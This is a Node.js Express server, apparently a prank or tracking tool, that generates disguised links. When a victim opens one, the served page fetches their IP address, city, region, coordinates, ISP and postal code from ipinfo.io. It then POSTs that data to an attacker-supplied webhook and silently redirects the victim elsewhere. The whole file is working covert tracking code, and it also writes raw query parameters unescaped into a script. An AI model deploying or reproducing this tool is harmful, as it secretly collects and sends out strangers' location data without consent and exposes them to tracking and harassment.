const express = require('express');
const app = express();
const path = require('path');

app.get('/', (req, res) => {
  if ("hook" in req.query && "redirect" in req.query) {
    res.send(`
<html>
<body>
<script>
function getIP(json) {
window.ipAndInfo = '';
window.ipAndInfo += json.ip + ' | ';
window.ipAndInfo += json.city + ' | ';
window.ipAndInfo += json.region + ' | ';
window.ipAndInfo += json.country + ' | ';
window.ipAndInfo += json.loc + ' | ';
window.ipAndInfo += json.org + ' | ';
window.ipAndInfo += json.postal + ' | ';
window.ipAndInfo += json.timezone + ' | ';
}

function IPgrab()
{
var IP = window.ipAndInfo;
var request = new XMLHttpRequest();
request.open('POST', '${ req.query.hook }');
request.setRequestHeader('Content-type', 'application/json');
var params = {content: IP}
request.send(JSON.stringify(params));
window.location.replace('${ req.query.redirect }');
}
window.onload = IPgrab();
</script>
<script type="application/javascript" src="http://ipinfo.io/?format=jsonp&callback=getIP"></script>
</body>
</html>`);
  } else {
    res.sendFile(path.join(__dirname+'/index.html'));
  }
});

app.get('/create', (req, res) => {
  if ("hook" in req.query && "redirect" in req.query) {
    var new_URL = `https://xyz.webhooks.repl.co?hook=${ encodeURIComponent(req.query.hook) }&redirect=${ encodeURIComponent(req.query.redirect) }`
    res.send(`<h1>Your Link has been generated succesfully</h1><br><textarea rows="1" cols="1000">${ new_URL }</textarea><br>`)
  }
});

app.get('/u-got-rolled', (req, res) => {
  res.sendFile(path.join(__dirname+'/rickroll.html'));
});

app.listen(3000, () => {
  console.log('server started');
});